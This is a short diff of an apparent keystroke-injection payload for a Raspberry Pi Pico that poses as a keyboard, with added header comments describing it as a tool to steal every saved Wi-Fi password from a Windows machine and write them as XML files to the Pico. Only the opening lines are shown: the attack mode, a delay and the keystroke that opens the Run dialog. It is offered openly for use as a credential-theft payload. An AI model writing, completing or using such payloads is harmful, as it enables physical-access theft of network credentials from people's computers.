@@ -1,3 +1,8 @@
+REM   Steal wifi passwords using raspberry pi pico
+REM   Target system: windows
+REM   Author: Sivagokul
+REM   Description: Use this payload to steal all wifi passwords stored in windows meachine, it store the password files in xml extension directly into your root directory of pico. 
+
 ATTACKMODE HID STORAGE
 DELAY 1000
 GUI r
